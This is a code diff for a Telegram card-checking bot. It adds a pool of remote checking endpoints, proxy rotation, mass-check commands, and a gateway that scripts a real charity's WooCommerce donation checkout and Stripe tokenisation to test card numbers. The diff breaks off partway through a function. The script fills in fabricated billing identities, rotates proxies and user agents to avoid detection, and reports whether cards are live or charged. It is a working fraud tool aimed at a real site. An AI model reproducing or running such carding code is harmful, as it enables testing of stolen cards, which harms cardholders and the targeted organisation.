@@ -10916,8 +10916,8 @@ class GatewayManager:
             # Shopify/Autosopi
             "shopify": {"enabled": True, "name": "Shopify", "emoji": "🛍️"},
             "autosopi": {"enabled": True, "name": "Autosopi", "emoji": "🤖"},
-            "aumc": {"enabled": True, "name": "Autosopi Mass", "emoji": "🤖"},
             "msh": {"enabled": True, "name": "Shopify Mass", "emoji": "🛍️"},
+
             
             # Stripe
             "stripe_charge": {"enabled": True, "name": "Stripe Charge", "emoji": "💳"},
@@ -10951,6 +10951,8 @@ class GatewayManager:
             # Adyen
             "adyen": {"enabled": True, "name": "Adyen", "emoji": "🌐"},
             "adyen_direct": {"enabled": True, "name": "Adyen Direct", "emoji": "🌐"},
+            
+            "st1_gateway": {"enabled": True, "name": "ST1 Gateway (forcesforchange.org)", "emoji": "💳"},
             
             # ST1
             "st1": {"enabled": True, "name": "ST1 Auth", "emoji": "🔐"},
@@ -11895,6 +11897,146 @@ SHOPIFY_API_POOL = [
         "avg_response_time": 0,
         "year_format": "2digit"
     },
+{
+        "name": " s31",
+        "url": "https://s31-production.up.railway.app/shopify",
+        "type": "get",
+        "params_format": "query",
+        "timeout": 45,
+        "weight": 15,
+        "enabled": True,
+        "success_count": 0,
+        "fail_count": 0,
+        "last_success": 0,
+        "avg_response_time": 0,
+        "year_format": "2digit"
+    },
+{
+        "name": " s32",
+        "url": "https://s32-production-3437.up.railway.app/shopify",
+        "type": "get",
+        "params_format": "query",
+        "timeout": 45,
+        "weight": 15,
+        "enabled": True,
+        "success_count": 0,
+        "fail_count": 0,
+        "last_success": 0,
+        "avg_response_time": 0,
+        "year_format": "2digit"
+    },
+{
+        "name": " s33",
+        "url": "https://s33-production.up.railway.app/shopify",
+        "type": "get",
+        "params_format": "query",
+        "timeout": 45,
+        "weight": 15,
+        "enabled": True,
+        "success_count": 0,
+        "fail_count": 0,
+        "last_success": 0,
+        "avg_response_time": 0,
+        "year_format": "2digit"
+    },
+{
+        "name": " s34",
+        "url": "https://s34-production.up.railway.app/shopify",
+        "type": "get",
+        "params_format": "query",
+        "timeout": 45,
+        "weight": 15,
+        "enabled": True,
+        "success_count": 0,
+        "fail_count": 0,
+        "last_success": 0,
+        "avg_response_time": 0,
+        "year_format": "2digit"
+    },
+{
+        "name": " s35",
+        "url": "https://s35-production.up.railway.app/shopify",
+        "type": "get",
+        "params_format": "query",
+        "timeout": 45,
+        "weight": 15,
+        "enabled": True,
+        "success_count": 0,
+        "fail_count": 0,
+        "last_success": 0,
+        "avg_response_time": 0,
+        "year_format": "2digit"
+    },
+{
+        "name": " s36",
+        "url": "https://s36-production.up.railway.app/shopify",
+        "type": "get",
+        "params_format": "query",
+        "timeout": 45,
+        "weight": 15,
+        "enabled": True,
+        "success_count": 0,
+        "fail_count": 0,
+        "last_success": 0,
+        "avg_response_time": 0,
+        "year_format": "2digit"
+    },
+{
+        "name": " s37",
+        "url": "https://s37-production.up.railway.app/shopify",
+        "type": "get",
+        "params_format": "query",
+        "timeout": 45,
+        "weight": 15,
+        "enabled": True,
+        "success_count": 0,
+        "fail_count": 0,
+        "last_success": 0,
+        "avg_response_time": 0,
+        "year_format": "2digit"
+    },
+{
+        "name": " s38",
+        "url": "https://s38-production.up.railway.app/shopify",
+        "type": "get",
+        "params_format": "query",
+        "timeout": 45,
+        "weight": 15,
+        "enabled": True,
+        "success_count": 0,
+        "fail_count": 0,
+        "last_success": 0,
+        "avg_response_time": 0,
+        "year_format": "2digit"
+    },
+{
+        "name": " s39",
+        "url": "https://s39-production.up.railway.app/shopify",
+        "type": "get",
+        "params_format": "query",
+        "timeout": 45,
+        "weight": 15,
+        "enabled": True,
+        "success_count": 0,
+        "fail_count": 0,
+        "last_success": 0,
+        "avg_response_time": 0,
+        "year_format": "2digit"
+    },
+{
+        "name": " s40",
+        "url": "https://s40-production.up.railway.app/shopify",
+        "type": "get",
+        "params_format": "query",
+        "timeout": 45,
+        "weight": 15,
+        "enabled": True,
+        "success_count": 0,
+        "fail_count": 0,
+        "last_success": 0,
+        "avg_response_time": 0,
+        "year_format": "2digit"
+    },
    
    
 ]
@@ -12210,33 +12352,43 @@ class ShopifyAPIPool:
         good_responses = 0  # Track good responses for this card
         attempt = 0
         
-        # Get user's working proxies for rotation
+        # ============ GET PROXIES FOR THIS USER ============
         user_proxies = []
-        
-        if user_id and user_id in autosopi_proxy_tracker.working_proxies:
-            user_proxies = autosopi_proxy_tracker.working_proxies.get(user_id, [])
-            
-            if proxy in user_proxies and len(user_proxies) > 1:
-                user_proxies = [p for p in user_proxies if p != proxy]
-                
-        
         global_proxies = []
-        if global_proxy_pool.enabled and global_proxy_pool.proxies:
-            global_proxies = global_proxy_pool.proxies.copy()
-            print(f"🌐 [Pool] Using {len(global_proxies)} global proxies")
-        else:
-            print(f"⚠️ [Pool] No global proxies available, using direct connection")
-            
-            if not user_proxies and global_proxies:
+        
+        # Check if global proxy only mode is enabled
+        if GLOBAL_PROXY_ONLY_MODE:
+            # Only use global proxies
+            if global_proxy_pool.enabled and global_proxy_pool.proxies:
+                global_proxies = global_proxy_pool.proxies.copy()
+                print(f"🌐 [GLOBAL ONLY] Using {len(global_proxies)} global proxies")
                 user_proxies = global_proxies
-                print(f"🌐 [Pool] Using global proxies as fallback: {len(user_proxies)}")
-                
+            else:
+                print(f"⚠️ [GLOBAL ONLY] No global proxies available")
+        else:
+            # Normal mode - user's personal proxies first
+            if user_id and user_id in autosopi_proxy_tracker.working_proxies:
+                user_proxies = autosopi_proxy_tracker.working_proxies.get(user_id, [])
+                print(f"👤 [User Proxies] Found {len(user_proxies)} working proxies for user {user_id}")
+            
+            # Fallback to global proxies if user has none
+            if not user_proxies and global_proxy_pool.enabled and global_proxy_pool.proxies:
+                user_proxies = global_proxy_pool.proxies.copy()
+                print(f"🌐 [Fallback] Using {len(user_proxies)} global proxies as fallback")
+        
+        # Remove the initial proxy from the list if it's there
+        if proxy and proxy in user_proxies and len(user_proxies) > 1:
+            user_proxies = [p for p in user_proxies if p != proxy]
+            print(f"🔄 Removed initial proxy from rotation pool")
+        
         if user_proxies:
-            print(f"🔄 [PROXY ROTATION] {len(user_proxies)} working proxies available for rotation")
+            print(f"🔄 [PROXY ROTATION] {len(user_proxies)} proxies available for rotation")
             for i, p in enumerate(user_proxies[:5]):
                 print(f"   {i+1}. {mask_proxy(p)}")
             if len(user_proxies) > 5:
                 print(f"   ... and {len(user_proxies) - 5} more")
+        else:
+            print(f"⚠️ No proxies available, using direct connection")
         
         # ============ FIX: Get ALL sites from autosopi manager ============
         all_sites = autosopi_site_manager.sites.copy()
@@ -12292,34 +12444,22 @@ class ShopifyAPIPool:
             
             # ============ PROXY ROTATION ON RETRY ============
             current_proxy = proxy
-            found_new_proxy = False 
+            found_new_proxy = False
+            
             if user_proxies:
                 if attempt > 1:
-                    found_new_proxy = False 
                     for p in user_proxies:
                         if p not in tried_proxies:
                             current_proxy = p
                             tried_proxies.append(p)
-                            print(f"🔄 [ATTEMPT #{attempt}] Rotating to NEW global proxy: {mask_proxy(current_proxy)}")
-                            
+                            print(f"🔄 [ATTEMPT #{attempt}] Rotating to NEW proxy: {mask_proxy(current_proxy)}")
+                            found_new_proxy = True
                             break
                 
                 # If all proxies tried, recycle one
                 if not found_new_proxy and user_proxies:
-                    # Try to find any proxy not currently rate-limited
-                    for p in user_proxies:
-                        if hasattr(autosopi_proxy_tracker, 'is_rate_limited'):
-                            if not autosopi_proxy_tracker.is_rate_limited(user_id, p):
-                                current_proxy = p
-                                tried_proxies.append(p)
-                                print(f"🔄 [ATTEMPT #{attempt}] Recycling proxy: {mask_proxy(current_proxy)}")
-                                found_new_proxy = True
-                                break
-                    
-                    # Last resort - use any proxy
-                    if not found_new_proxy:
-                        current_proxy = user_proxies[attempt % len(user_proxies)]
-                        print(f"🔄 [ATTEMPT #{attempt}] Forcing proxy rotation: {mask_proxy(current_proxy)}")
+                    current_proxy = user_proxies[attempt % len(user_proxies)]
+                    print(f"🔄 [ATTEMPT #{attempt}] Recycling proxy: {mask_proxy(current_proxy)}")
             
             print(f"\n🔍 [API POOL] Attempt {attempt} using: {api_name} (Site: {current_site})")
             print(f"📊 Sites tried: {len(tried_sites)}/{total_sites}")
@@ -12348,22 +12488,20 @@ class ShopifyAPIPool:
                 response_upper = response_text.upper()
                 status_category = result.get("status_category", "")
                 
+                # Check for no products errors
                 no_products_indicators = [
-                "No products under $10",
-                "No products under $10 found!",
-                "NO PRODUCTS UNDER $10"
+                    "No products under $10",
+                    "No products under $10 found!",
+                    "NO PRODUCTS UNDER $10"
                 ]
                 
                 is_no_products = any(indicator in response_upper for indicator in no_products_indicators)
                 
                 if is_no_products:
                     print(f"🔄 [RETRY] No products under $10 for site {current_site}, trying next site...")
-                    
                     site_quality_tracker.record_response(current_site, response_text, "no_products", price=999.99)
                     self.mark_api_result(api_name, False, elapsed, True)
                     continue
-                
-                
                 
                 # ============ CHECK FOR GOOD RESPONSE ============
                 is_good_response = self._is_good_response(response_text)
@@ -12548,9 +12686,8 @@ class ShopifyAPIPool:
         }
     
     async def _make_api_request(self, api: dict, card: str, site: str, proxy: str = None, user_id: int = None) -> Dict:
-        """Make request to a specific API with site quality tracking"""
+        """Make request to a specific API with proxy support"""
         
-
         # Parse card
         parts = card.split('|')
         if len(parts) != 4:
@@ -12577,8 +12714,6 @@ class ShopifyAPIPool:
         if site_clean.endswith('/'):
             site_clean = site_clean[:-1]
         
-        session = await self.get_session()
-        
         # Track if site was removed
         site_removed = False
         
@@ -12591,15 +12726,37 @@ class ShopifyAPIPool:
             print(f"📤 [BLADESARKS API] Request to: {api['url']}")
             print(f"📤 Params: site=https://{site_clean}, cc={formatted_card[:20]}...")
             
-            # Add proxy if provided
+            # ============ CONFIGURE PROXY FOR THE REQUEST ============
+            # Method 1: Add proxy as a parameter to the API
             if proxy:
                 proxy_param = format_proxy_for_shopify_mass(proxy)
                 if proxy_param:
                     clean_proxy = proxy_param.replace('http://', '')
                     params["proxy"] = clean_proxy
-                    print(f"🔧 Using proxy: {mask_proxy(clean_proxy)}")
+                    print(f"🔧 API proxy param: {mask_proxy(clean_proxy)}")
+                else:
+                    print(f"⚠️ Could not format proxy for API param: {mask_proxy(proxy)}")
             
-            response = await session.get(api["url"], params=params)
+            # Method 2: Configure httpx client with proxy
+            client_kwargs = {
+                'timeout': httpx.Timeout(45.0, connect=15.0, read=40.0),
+                'verify': False,
+                'follow_redirects': True,
+                'limits': httpx.Limits(max_keepalive_connections=5, max_connections=10)
+            }
+            
+            # Add proxy to client if available
+            if proxy:
+                formatted_proxy = format_proxy(proxy)
+                if formatted_proxy:
+                    client_kwargs['proxy'] = formatted_proxy
+                    print(f"🔧 Client proxy configured: {mask_proxy(formatted_proxy)}")
+                else:
+                    print(f"⚠️ Could not format proxy for client: {mask_proxy(proxy)}")
+            
+            # Make the request with proxy-enabled client
+            async with httpx.AsyncClient(**client_kwargs) as client:
+                response = await client.get(api["url"], params=params)
             
             elapsed = response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0
             print(f"📥 Response time: {elapsed:.2f}s | Status: {response.status_code}")
@@ -12977,7 +13134,7 @@ shopify_api_pool = ShopifyAPIPool()
 
 @check_gateway("aumc")
 async def aumc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Wrapper for /aumc command - extracts cards and calls mass check logic"""
+    """Wrapper for /msh command - extracts cards and calls mass check logic"""
     if not await verify_group_access(update, context):
         return
     
@@ -13039,10 +13196,10 @@ async def aumc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
         await message.reply_text(
             "📦 <b>New Autosopi Mass Check</b>\n\n"
-            "Usage: <code>/aumc &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
+            "Usage: <code>/msh &lt;card1&gt; &lt;card2&gt; ...</code>\n\n"
             "Examples:\n"
-            "<code>/aumc 4111111111111111|12|25|123 4222222222222222|11|24|456</code>\n\n"
-            "Or reply to a .txt file with /aumc",
+            "<code>/msh 4111111111111111|12|25|123 4222222222222222|11|24|456</code>\n\n"
+            "Or reply to a .txt file with /msh",
             parse_mode=ParseMode.HTML
         )
         return
@@ -17077,8 +17234,6 @@ async def auto_detect_reply_with_command(update: Update, context: ContextTypes.D
         
         # Shopify / Autosopi
         '/sh': ('shopify', False),
-        '/shopify': ('shopify', False),
-        '/auc': ('autosopi', False),
         '/autosopi': ('autosopi', False),
         
         # Stripe Charge
@@ -17105,16 +17260,14 @@ async def auto_detect_reply_with_command(update: Update, context: ContextTypes.D
         # Adyen
         '/ad': ('adyen', False),
         
-        # Auto Stripe
-        '/chk': ('auto_stripe', False),
+
         
         # New Stripe
         '/nstripe': ('new_stripe', False),
         
         # Mass check commands (if user replies with mass command)
         '/mpp': ('paypal', True),
-        '/aumc': ('autosopi', True),
-        '/msh': ('shopify', True),
+        '/msh': ('autosopi', True),
         '/msc': ('stripe_charge_v2', True),
         '/mrz': ('razorpay', True),
         '/mb3': ('b3charged', True),
@@ -17331,7 +17484,7 @@ class UserManager:
             "can_use_proxy": True,
             "can_access_gateways": [
                 "shopify", "auto_stripe", "adyen_direct", "paypal", "stripe_charge_v2","adyen","stripe_pl","stripe_auth0",
-                "b3charged", "razorpay", "stripe_charge", "stripe_auth","paypal_donation",
+                "b3charged", "razorpay", "stripe_charge", "stripe_auth","paypal_donation", "stripe_chk", "st1_gateway" ,
                 "dork", "braintree", "autosopi", "payflow"
             ],
             "can_add_autosopi_sites": True,
@@ -17352,7 +17505,7 @@ class UserManager:
             "can_access_gateways": [
                 "paypal", "shopify", "adyen_direct", "auto_stripe","stripe_charge_v2", "adyen","stripe_pl","stripe_auth0",
                 "b3charged", "razorpay", "stripe_charge", "stripe_auth", "paypal_donation",
-                "braintree", "autosopi", "payflow"
+                "braintree", "autosopi", "payflow", "stripe_chk","st1_gateway" ,
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -21911,7 +22064,1028 @@ async def ezycourse_mass_check_logic(update: Update, context: ContextTypes.DEFAU
         ezycourse_active_tasks.pop(u_id, None)
         print(f"🏁 [EzyCourse Mass] Session ended for user {u_id}")
         
+  
+  
+# ============ ST1 GATEWAY (forcesforchange.org) - ADD THIS TO f13.py ============
+# Add this after your other gateway configurations
+
+import json
+import random
+import re
+import string
+import time
+from urllib.parse import quote_plus
+import requests
+
+# Active tasks for ST1 gateway
+st1_gateway_active_tasks = {}
+
+# ============ ST1 GATEWAY CONFIGURATION ============
+ST1_HTTP_TIMEOUT = (10, 25)
+ST1_USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+]
+
+ST1_FIRST_NAMES = [
+    'James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard',
+    'Joseph', 'Thomas', 'Charles', 'Emily', 'Emma', 'Olivia', 'Ava',
+    'Isabella', 'Sophia', 'Mia', 'Charlotte', 'Amelia', 'Harper',
+]
+ST1_LAST_NAMES = [
+    'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller',
+    'Davis', 'Wilson', 'Taylor', 'Anderson', 'Thomas', 'Jackson', 'White',
+    'Harris', 'Martin', 'Thompson', 'Moore', 'Young', 'Allen',
+]
+ST1_STREETS = [
+    'Main St', 'Oak Ave', 'Maple Dr', 'Cedar Ln', 'Pine Rd', 'Elm St',
+    'Washington Blvd', 'Park Ave', 'Lake Dr', 'Hill Rd',
+]
+ST1_CITIES_STATES = [
+    ('Phoenix', 'AZ', '850'), ('Los Angeles', 'CA', '900'),
+    ('Houston', 'TX', '770'), ('Chicago', 'IL', '606'),
+    ('Dallas', 'TX', '752'), ('San Antonio', 'TX', '782'),
+    ('San Diego', 'CA', '921'), ('Jacksonville', 'FL', '322'),
+    ('Austin', 'TX', '787'), ('Columbus', 'OH', '432'),
+]
+
+ST1_STRIPE_PK = (
+    'pk_live_51RJd5fGlfOdBh4Nl2YUzFnY6zYb5IEAkHYSatP353K0wRioIydSEkrK'
+    'fWMrApQmyNrPafBOqLy4KQ4a5O3aVODi500IGgjyNG6'
+)
+ST1_CHARGED_RESPONSE = "Payment Success"
+
+
+def _st1_http_error(exc: requests.RequestException) -> dict:
+    """Handle HTTP errors for ST1 gateway"""
+    low = str(exc).lower()
+    if isinstance(exc, requests.Timeout) or "timed out" in low:
+        return {"status": "ERROR", "response": "Request timed out", "time": "0s"}
+    if isinstance(exc, requests.exceptions.ProxyError) or "proxy" in low or "tunnel" in low:
+        return {"status": "ERROR", "response": str(exc)[:200], "time": "0s"}
+    return {"status": "ERROR", "response": str(exc)[:200], "time": "0s"}
+
+
+def _st1_process_card_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str = None) -> dict:
+    """
+    Synchronous ST1 card check - runs in thread pool
+    Returns: dict with status, response, time
+    """
+    started = time.perf_counter()
+    if len(yy) == 2:
+        yy = "20" + yy[-2:]
+    mm = mm.zfill(2)
+
+    try:
+        user_agent = random.choice(ST1_USER_AGENTS)
+
+        first_name = random.choice(ST1_FIRST_NAMES)
+        last_name = random.choice(ST1_LAST_NAMES)
+        full_name = f"{first_name} {last_name}"
+        email_user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        email = f"{email_user}@gmail.com"
+        street_num = random.randint(100, 99999)
+        street = random.choice(ST1_STREETS)
+        address = f"{street_num} {street}"
+        city, state, zip_prefix = random.choice(ST1_CITIES_STATES)
+        zip_code = zip_prefix + str(random.randint(10, 99))
+
+        session = requests.Session()
+        session.trust_env = False
+        if proxy_url:
+            session.proxies = {"http": proxy_url, "https": proxy_url}
+            print(f"🔧 [ST1] Using proxy: {mask_proxy(proxy_url)}")
+
+        # Step 1: visit donate page
+        init_headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
+            'user-agent': user_agent,
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+        }
+        init_resp = session.get(
+            'https://forcesforchange.org/donate/',
+            headers=init_headers,
+            timeout=ST1_HTTP_TIMEOUT,
+        )
+        if init_resp.status_code >= 400:
+            elapsed = f"{time.perf_counter() - started:.2f}s"
+            return {
+                "status": "ERROR",
+                "response": f"Donate page HTTP {init_resp.status_code}",
+                "time": elapsed,
+            }
+
+        # Step 2: add item to cart
+        product_id_match = (
+            re.search(r'["\']add-to-cart["\']\s*value=["\'](\d+)["\']', init_resp.text)
+            or re.search(r'\?add-to-cart=(\d+)', init_resp.text)
+            or re.search(r'"product_id"\s*:\s*(\d+)', init_resp.text)
+        )
+        product_id = product_id_match.group(1) if product_id_match else None
+
+        if product_id:
+            session.post(
+                'https://forcesforchange.org/',
+                params={'wc-ajax': 'add_to_cart'},
+                headers={
+                    'accept': 'application/json, text/javascript, */*; q=0.01',
+                    'accept-language': 'en-US,en;q=0.9',
+                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'origin': 'https://forcesforchange.org',
+                    'referer': 'https://forcesforchange.org/donate/',
+                    'user-agent': user_agent,
+                    'x-requested-with': 'XMLHttpRequest',
+                    'sec-fetch-dest': 'empty',
+                    'sec-fetch-mode': 'cors',
+                    'sec-fetch-site': 'same-origin',
+                },
+                data={'product_id': product_id, 'quantity': '1'},
+                timeout=ST1_HTTP_TIMEOUT,
+            )
+        else:
+            add_to_cart_match = re.search(
+                r'<form[^>]+class="[^"]*cart[^"]*"[^>]*>(.*?)</form>',
+                init_resp.text, re.DOTALL,
+            )
+            if add_to_cart_match:
+                inputs = re.findall(
+                    r'<input[^>]+name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
+                    add_to_cart_match.group(1),
+                )
+                session.post(
+                    'https://forcesforchange.org/donate/',
+                    headers={
+                        'content-type': 'application/x-www-form-urlencoded',
+                        'origin': 'https://forcesforchange.org',
+                        'referer': 'https://forcesforchange.org/donate/',
+                        'user-agent': user_agent,
+                    },
+                    data=dict(inputs),
+                    timeout=ST1_HTTP_TIMEOUT,
+                )
+
+        # Step 3: load checkout page for nonce
+        checkout_page = session.get(
+            'https://forcesforchange.org/checkout/',
+            headers=init_headers,
+            timeout=ST1_HTTP_TIMEOUT,
+        )
+
+        nonce_match = (
+            re.search(r'"woocommerce-process-checkout-nonce"\s*value="([^"]+)"', checkout_page.text)
+            or re.search(r'"checkout_nonce"\s*:\s*"([^"]+)"', checkout_page.text)
+            or re.search(r'"woocommerce-process-checkout-nonce"\s*value="([^"]+)"', init_resp.text)
+            or re.search(r'"checkout_nonce"\s*:\s*"([^"]+)"', init_resp.text)
+        )
+        nonce = nonce_match.group(1) if nonce_match else '716ee815cf'
+
+        # Step 4: tokenize card with Stripe
+        stripe_mid = session.cookies.get('__stripe_mid', 'c1ccf2d6-5b18-4fdc-a355-a6238ee7137bfb20e4')
+        stripe_sid = session.cookies.get('__stripe_sid', 'd75866ab-c96e-4246-a6f5-7ff152f406ebcef345')
+
+        stripe_headers = {
+            'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'user-agent': user_agent,
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+        }
+
+        stripe_data = (
+            f'billing_details[name]={quote_plus(full_name)}'
+            f'&billing_details[email]={quote_plus(email)}'
+            f'&billing_details[address][city]={quote_plus(city)}'
+            '&billing_details[address][country]=US'
+            f'&billing_details[address][line1]={quote_plus(address)}'
+            '&billing_details[address][line2]='
+            f'&billing_details[address][postal_code]={zip_code}'
+            f'&billing_details[address][state]={state}'
+            '&type=card'
+            f'&card[number]={cc}'
+            f'&card[cvc]={cvc}'
+            f'&card[exp_year]={yy}'
+            f'&card[exp_month]={mm}'
+            '&allow_redisplay=unspecified'
+            '&pasted_fields=number'
+            '&payment_user_agent=stripe.js%2Fc891fde8fc%3B+stripe-js-v3%2Fc891fde8fc'
+            '%3B+payment-element%3B+deferred-intent'
+            '&referrer=https%3A%2F%2Fforcesforchange.org'
+            '&time_on_page=114823'
+            f'&guid={stripe_mid}'
+            f'&muid={stripe_mid}'
+            f'&sid={stripe_sid}'
+            f'&key={ST1_STRIPE_PK}'
+            '&_stripe_version=2024-06-20'
+        )
+
+        stripe_resp = session.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers=stripe_headers,
+            data=stripe_data,
+            timeout=ST1_HTTP_TIMEOUT,
+        )
+        try:
+            stripe_json = stripe_resp.json()
+        except Exception as je:
+            elapsed = f"{time.perf_counter() - started:.2f}s"
+            return {"status": "ERROR", "response": f"Stripe JSON error: {je}", "time": elapsed}
+
+        payment_method_id = stripe_json.get('id', '')
+
+        elapsed = f"{time.perf_counter() - started:.2f}s"
+
+        if not payment_method_id or not payment_method_id.startswith('pm_'):
+            err_msg = (
+                stripe_json.get('error', {}).get('message')
+                or stripe_json.get('error', {}).get('code')
+                or 'Stripe tokenization failed'
+            )
+            return {"status": "DECLINED", "response": err_msg, "time": elapsed}
+
+        # Step 5: submit WooCommerce checkout
+        checkout_headers = {
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://forcesforchange.org',
+            'referer': 'https://forcesforchange.org/donate/',
+            'user-agent': user_agent,
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'x-requested-with': 'XMLHttpRequest',
+        }
+
+        checkout_data = (
+            'wc_order_attribution_source_type=typein'
+            '&wc_order_attribution_referrer=(none)'
+            '&wc_order_attribution_utm_campaign=(none)'
+            '&wc_order_attribution_utm_source=(direct)'
+            '&wc_order_attribution_utm_medium=(none)'
+            '&wc_order_attribution_utm_content=(none)'
+            '&wc_order_attribution_utm_id=(none)'
+            '&wc_order_attribution_utm_term=(none)'
+            '&wc_order_attribution_utm_source_platform=(none)'
+            '&wc_order_attribution_utm_creative_format=(none)'
+            '&wc_order_attribution_utm_marketing_tactic=(none)'
+            '&wc_order_attribution_session_entry=https%3A%2F%2Fforcesforchange.org%2Fdonate%2F'
+            '&wc_order_attribution_session_pages=1'
+            '&wc_order_attribution_session_count=1'
+            f'&billing_email={quote_plus(email)}'
+            f'&billing_first_name={quote_plus(first_name)}'
+            f'&billing_last_name={quote_plus(last_name)}'
+            '&billing_country=US'
+            f'&billing_address_1={quote_plus(address)}'
+            '&billing_address_2='
+            f'&billing_city={quote_plus(city)}'
+            f'&billing_state={state}'
+            f'&billing_postcode={zip_code}'
+            '&billing_phone='
+            '&lang=en'
+            '&payment_method=stripe'
+            '&wc-stripe-payment-method-upe='
+            '&wc_stripe_selected_upe_payment_type='
+            '&wc-stripe-is-deferred-intent=1'
+            f'&woocommerce-process-checkout-nonce={nonce}'
+            '&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
+            f'&wc-stripe-payment-method={payment_method_id}'
+        )
+
+        checkout_resp = session.post(
+            'https://forcesforchange.org/',
+            params={'wc-ajax': 'checkout'},
+            headers=checkout_headers,
+            data=checkout_data,
+            timeout=ST1_HTTP_TIMEOUT,
+        )
+
+        elapsed = f"{time.perf_counter() - started:.2f}s"
+
+        try:
+            cj = checkout_resp.json()
+        except Exception:
+            return {
+                "status": "ERROR",
+                "response": checkout_resp.text[:200],
+                "time": elapsed,
+            }
+
+        if cj.get("result") == "success" or cj.get("redirect") or cj.get("order_id"):
+            return {
+                "status": "APPROVED",
+                "response": ST1_CHARGED_RESPONSE,
+                "time": elapsed,
+            }
+
+        msg = ""
+        if isinstance(cj.get("messages"), str):
+            clean = re.sub(r"<[^>]+>", "", cj["messages"]).strip()
+            if clean:
+                msg = clean
+        if not msg:
+            msg = str(cj.get("message") or cj.get("code") or "Declined")
+
+        # Check for specific error types
+        msg_lower = str(msg).lower()
+        if "insufficient" in msg_lower or "funds" in msg_lower:
+            return {"status": "APPROVED", "response": "Insufficient Funds - Card is LIVE", "time": elapsed}
+        if "cvv" in msg_lower or "security" in msg_lower:
+            return {"status": "APPROVED", "response": "CVV Live - Card is valid", "time": elapsed}
+        if "declined" in msg_lower or "card_declined" in msg_lower:
+            return {"status": "DECLINED", "response": msg, "time": elapsed}
+        if "expired" in msg_lower:
+            return {"status": "DECLINED", "response": "Expired Card", "time": elapsed}
+
+        return {"status": "DECLINED", "response": msg or "Declined", "time": elapsed}
+
+    except requests.RequestException as exc:
+        elapsed = f"{time.perf_counter() - started:.2f}s"
+        err = _st1_http_error(exc)
+        err["time"] = elapsed
+        return err
+    except Exception as exc:
+        elapsed = f"{time.perf_counter() - started:.2f}s"
+        return {"status": "ERROR", "response": str(exc)[:200], "time": elapsed}
+
+
+def _st1_clean_gate_msg(msg: str, limit: int = 120) -> str:
+    """Clean gateway response message"""
+    s = re.sub(r"<[^>]+>", " ", str(msg or ""))
+    s = re.sub(r"\s+", " ", s).strip()
+    if "{" in s:
+        s = s.split("{", 1)[0].strip()
+    return (s[:limit] if s else "Declined")
+
+
+def _st1_map_result(raw: dict) -> Tuple[str, str, str]:
+    """Map ST1 result to bot status"""
+    api_status = str(raw.get("status") or "")
+    resp = str(raw.get("response") or "")
+    clean_resp = _st1_clean_gate_msg(resp, 200)
+
+    if api_status.upper() == "APPROVED":
+        return "charged", ST1_CHARGED_RESPONSE, "charged"
+
+    if api_status.upper() == "ERROR":
+        low = f"{resp}".lower()
+        if "timed out" in low or "timeout" in low:
+            return "error", clean_resp or "Request timed out", "timeout"
+        if "proxy" in low or "tunnel" in low:
+            return "error", clean_resp or "Proxy error", "proxy_error"
+        return "error", _st1_clean_gate_msg(clean_resp) or "Unknown error", "connection_error"
+
+    if api_status.upper() == "DECLINED":
+        return "declined", _st1_clean_gate_msg(clean_resp) or "Card declined", "declined"
+
+    return "declined", _st1_clean_gate_msg(clean_resp) or "Card declined", "declined"
+
+
+async def check_card_st1_gateway(card: str, proxy: str = None, user_id: int = None) -> Dict:
+    """
+    Check card using ST1 Gateway (forcesforchange.org)
+    """
+    print(f"\n{'='*80}")
+    print(f"💳 [ST1 GATEWAY] Checking card: {card[:20]}...")
+    if proxy:
+        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
+    else:
+        print(f"🔌 No proxy - direct connection")
+    print(f"{'='*80}")
+
+    default_result = {
+        "status": "error",
+        "result": "UNKNOWN_ERROR",
+        "message": "Unknown error occurred",
+        "status_display": "⚠️ ERROR",
+        "status_category": "error",
+        "elapsed": 0,
+        "price": "$0.00",
+        "gateway": "ST1 Gateway"
+    }
+
+    try:
+        # Parse card
+        parts = card.split('|')
+        if len(parts) != 4:
+            return {
+                "status": "error",
+                "result": "INVALID_FORMAT",
+                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
+                "status_display": "⚠️ INVALID FORMAT",
+                "status_category": "error"
+            }
+
+        cc, mm, yy, cvv = parts
         
+        # Format proxy for requests
+        proxy_url = None
+        if proxy:
+            proxy_url = format_proxy(proxy)
+            if proxy_url:
